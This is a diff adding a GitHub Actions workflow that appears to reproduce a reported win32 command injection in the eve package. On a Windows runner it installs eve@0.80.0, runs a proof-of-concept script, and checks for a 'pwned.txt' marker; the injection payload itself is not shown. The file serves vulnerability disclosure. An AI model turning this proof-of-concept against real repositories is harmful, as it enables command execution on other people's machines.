@@ -1,0 +1,57 @@
+# Windows proof for: vercel/eve win32 command injection via a repo-shipped .vercel/project.json
+#
+# The runner is windows-latest, so process.platform === 'win32' and eve's real win32 branch
+# (shell: true -> cmd.exe /d /s /c) is selected naturally. The `vercel` CLI is deliberately
+# NOT installed, to show the injection does not need it. No Vercel service is contacted.
+#
+# Push this directory as a repo, then Actions -> eve-win32-proof -> Run workflow.
+name: eve-win32-proof
+on: [workflow_dispatch, push]
+
+jobs:
+  prove:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '24.22.0'   # pinned to the version named in the report — not "latest"
+
+      - name: Install the affected artifact (eve@0.80.0 only — no vercel CLI)
+        shell: pwsh
+        run: |
+          npm init -y | Out-Null
+          npm install eve@0.80.0 --no-audit --no-fund
+
+      - name: Show the repo-shipped link file
+        shell: pwsh
+        run: Get-Content .\.vercel\project.json
+
+      - name: Run the real sink (default platform — no forcing)
+        shell: pwsh
+        run: |
+          node poc.mjs
+          Write-Host "node exit=$LASTEXITCODE"
+
+      - name: Assert + show the marker
+        shell: pwsh
+        run: |
+          Write-Host "--- proof-output.txt ---"
+          Get-Content .\proof-output.txt
+          Write-Host "--- pwned.txt ---"
+          if (Test-Path .\pwned.txt) {
+            Write-Host "MARKER PRESENT"
+            Get-Content .\pwned.txt
+          } else {
+            Write-Host "MARKER MISSING"
+            exit 1
+          }
+
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: eve-win32-proof
+          path: |
+            pwned.txt
+            proof-output.txt
